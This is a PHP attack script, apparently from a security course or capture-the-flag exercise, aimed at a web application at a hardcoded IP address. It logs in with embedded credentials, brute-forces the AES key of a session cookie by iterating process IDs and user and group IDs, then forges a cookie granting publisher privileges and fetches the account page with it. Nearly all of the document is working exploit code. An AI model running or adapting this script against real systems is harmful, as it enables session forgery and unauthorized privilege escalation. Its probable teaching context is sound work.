<?php

// Command line args
// ARG1: LOCAL_SYSTEM_IP
// ARG2: Client port to use

if (count($argv) < 3){
  print "Usage: \n";
  print "  ./get_token.php [LOCAL_IP] [LOCAL_PORT]\n";
  exit(1);
}

// The list of all uid/primary-gid pairs
$POSSIBLE_PAIRS = [ [10895,1003], // jan - known
  // [0,0], [1,1], [2,2], [3,3], [4,65534], [5,60], [6,12], [7,7], [8,8], 
  // [9,9], [10,10], [13,13], [34,34], [38,38], [39,39], [41,41], [65534,65534], 
  // [100,102], [101,103], [102,104], [103,105], [104,108], [105,65534], [106,110], [107,65534], 
  // [108,65534], [109,65534], [6929,6929], [110,115], [111,116], [112,117], [598,598], 
  // [486,486], [10895,1003], [3570,1003], [4726,1003], [230784,1003], [10896,6930], [113,118], 
  // [10521,10521]
];

// the list of all groups on the server
$POSSIBLE_GROUPS = [ 0, //root - known
  // 0,1,2,3,4,5,6,7,8,9,10,12,13,15,20,21,22,24,25,26,27,29,30,34,37,38,
  // 39,40,41,42,43,44,45,46,50,60,100,65534,101,102,103,104,105,106,107,108,109,110,111,112,6929,
  // 113,114,115,116,117,598,486,1003,6930,118,119,10521,120
];

$config_data = array(
  "server_name" =>  ["152.2.133.235"], // Try everything.
  "server_port" => 80,
  "local_port" => $argv[2],
  "local_name" => $argv[1],
  "user_agent" => "XX"
);
$ACCOUNT_URL = "http://".$config_data['server_name'][0]."/account.php";
$INDEX_URL =  "http://".$config_data['server_name'][0]."/index.php";
$POSSIBLE_ENCRYPTED = [
  "== SecureToken LoggedIn=True Publisher=False ==",
  "== SecureToken LoggedIn=True Publisher=True ==",
  // "== SecureToken LoggedIn=True Publisher=True == ",
  // "== SecureToken LoggedIn=True Publisher=False == ",
];
$ENCRYPT_THIS = '== SecureToken LoggedIn=True Publisher=True == ';
$CREDS = array(
  "user" => "fabian",
  "pass" => "fauxtatoes"
);

/** 
* Send a POST requst using cURL 
* @param string $url to request 
* @param array $post values to send 
* @param array $options for cURL 
* @return string 
*/ 
function curl_post($url, array $post = NULL, array $options = array(), array $cookies = array()) 
{ 
  $cookiestring = "";
  foreach ($cookies as $name => $content) {
    $cookiestring .= $name . "=" . $content . ";";
  }
  echo "Sending request with cookies: " . $cookiestring . "\n";
  global $config_data;
  $defaults = array( 
    CURLOPT_POST => 1, 
    CURLOPT_LOCALPORT => $config_data['local_port'],
    CURLOPT_HEADER => 1, 
    CURLOPT_URL => $url, 
    CURLOPT_FRESH_CONNECT => 1, 
    CURLOPT_RETURNTRANSFER => 1, 
    CURLOPT_FORBID_REUSE => 1, 
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_COOKIE => $cookiestring,
    CURLOPT_TIMEOUT => 4, 
    CURLOPT_POSTFIELDS => http_build_query($post),
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_TIMEVALUE => rtrim(time(),"\0"),
    CURLOPT_USERAGENT => $config_data['user_agent'],
    CURLOPT_HTTPHEADER => array("Host: " . $config_data['server_name'][0].":80" )
  );
  $ch = curl_init(); 
  curl_setopt_array($ch, ($options + $defaults)); 
  if( ! $result = curl_exec($ch)) 
  { 
      trigger_error(curl_error($ch)); 
  } 
  // echo $result;
  preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
  $cookies = array();
  foreach($matches[1] as $item) {
    parse_str($item, $cookie);
    $cookies = array_merge($cookies, $cookie);
  }
  echo "\n Dumping cookies returned...\n ";
  var_dump($cookies);
  curl_close($ch); 
  return array(
    "text"=>$result,
    "cookies"=>$cookies
    );
} 

/** 
* Send a GET requst using cURL 
* @param string $url to request 
* @param array $get values to send 
* @param array $options for cURL 
* @return string 
*/ 
function curl_get($url, array $get = NULL, array $options = array(), array $cookies = array()) 
{    
  $cookiestring = "";
  foreach ($cookies as $name => $content) {
    $cookiestring .= $name . "=" . $content . ";";
  }
  echo "Sending request with cookies: " . $cookiestring . "\n";
  global $config_data;
  $defaults = array( 
    CURLOPT_URL => $url. (strpos($url, '?') === FALSE ? '?' : ''). http_build_query($get), 
    CURLOPT_HEADER => 1, 
    CURLOPT_RETURNTRANSFER => TRUE, 
    CURLOPT_TIMEOUT => 4,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_USERAGENT => $config_data['user_agent'],
    CURLOPT_TIMEVALUE => rtrim(time(),"\0"),
    CURLOPT_COOKIE => $cookiestring,
    CURLOPT_HTTPHEADER => array("Host: " .$config_data['server_name'][0].":80" )
  ); 
  
  $ch = curl_init(); 
  curl_setopt_array($ch, ($options + $defaults)); 
  if( ! $result = curl_exec($ch)) 
  { 
      trigger_error(curl_error($ch)); 
  } 
  // echo $result;
  preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
  $cookies = array();
  foreach($matches[1] as $item) {
      parse_str($item, $cookie);
      $cookies = array_merge($cookies, $cookie);
  }
  curl_close($ch); 
  return array(
    "text"=>$result,
    "cookies"=>$cookies
    );
} 

// Log out...
$resp = curl_get($INDEX_URL, array("logout" => "True"), array());
if (strpos($resp['text'], "Please log in to obtain more details about the project.") === False){
  echo $resp['text'];
  echo "Logout failed...\n";
  exit(1);
} else {
  echo "Logged out...\n";
}

// Log back in, and a new token will be generated...
$generation_time = time();
$resp = curl_post($INDEX_URL, $CREDS, array(), array());
if (!strpos($resp['text'], "Please log in to obtain more details about the project.") === False){
  echo $resp['text'];
  echo "Login failed...\n";
  exit(1);
} else {
  echo "Logged in!\n";
}

// Fetch the encrypted token from the response..
$array_keys = array_keys($resp['cookies']);
$saved_cookies = $resp['cookies'];
$encrypted_APIKEY_TOKEN = $resp['cookies'][$array_keys[1]];
echo "The string to match is " . $encrypted_APIKEY_TOKEN . "\n";

// Send another request to be sure we are still logged in.
$resp = curl_get($INDEX_URL, array(), array(), $resp['cookies']);
if (strpos($resp['text'], "Please log in to obtain more details about the project.") === false){
  echo "Still logged in...\n";
} else {
  echo "We were logged out, something went wrong...\n";
}

// Verify that our tokens have persisted through this request...
if (isset($resp['cookies'][$array_keys[0]])){
  echo "We got new cookies for some reason.. die..\n";
  exit(1);
}

// Iterate over all PIDs and see if we can get a match...
$done = False;
for ($i = 0; $i <= 32768; $i++) { 
  if ($i % 100 == 0){
    echo $i."\n";
  }
  if ($done){ break;}
  foreach($POSSIBLE_GROUPS as $grp){
    if ($done){ break;}
    foreach ($config_data['server_name'] as $name){
      if ($done){ break;}
      foreach ($POSSIBLE_PAIRS as $pair){
        if ($done){ break;}
        // make a key for each gid/uid pair
        $key = '';
        $key .= '::' . $generation_time;       // known
        $key .= '::' . $config_data['user_agent'];  // forced known
        $key .= '::' . $i;                          // Pid max confirmed from /proc/sys/kernel/pid_max
        $key .= '::' . $name; // known
        $key .= '::' . $config_data['server_port']; // known
        $key .= '::' . $config_data['local_name'];  // MY IP
        $key .= '::' . $config_data['local_port'];  // forced known
        $key .= '::' . $pair[0];                    // UID of owner
        $key .= '::' . $grp;                        // GID of owner
        // echo "Key: " . $key . "\n";
        $raw_key = $key;
        $key = md5($key, True);
        $iv = md5($key, True);

        $decrypted = rtrim(openssl_decrypt($encrypted_APIKEY_TOKEN, 'aes-128-cbc', $key, False, $iv), "\0");
        if (strpos($decrypted, "SecureToken") === False){
          // echo $decrypted . " != " . $string_to_match . "\n";
          // echo $candidate . "\n";
          // $done=True;
        } else {
          //the two match.  We found the key...
          echo $encrypted_APIKEY_TOKEN . "\n";
          echo "Key: " . $raw_key . "\n";
          echo $i . "\n";
          $done = True;

          $saved_cookies[$array_keys[1]] = openssl_encrypt($ENCRYPT_THIS, 'aes-128-cbc',  $key, False, $iv);
          var_dump($saved_cookies);
          $decrypted = rtrim(openssl_decrypt($saved_cookies[$array_keys[1]], 'aes-128-cbc', $key, False, $iv), "\0");
          if (!strcmp($decrypted,'== SecureToken LoggedIn=True Publisher=True == ')) {
            echo "They matched...\n";
            $resp = curl_get($ACCOUNT_URL, array(), array(), $saved_cookies);
            echo $resp['text'];
          } else {
            echo "They did not match...\n";
          }
          break;
        }
      }
    }
  }
}
if (!$done){
  echo "Key not found...\n";  
}
?>
